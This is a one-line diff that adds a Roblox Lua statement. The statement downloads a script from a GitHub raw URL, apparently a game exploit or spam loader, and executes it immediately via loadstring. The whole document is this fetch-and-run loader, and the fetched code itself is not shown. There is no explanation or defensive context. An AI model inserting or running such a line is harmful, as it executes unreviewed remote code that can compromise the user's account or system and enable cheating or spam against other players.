@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/morph-world-rainbow-dinosaurs-spam6-h3j239ebo6fkz8.lua"))()
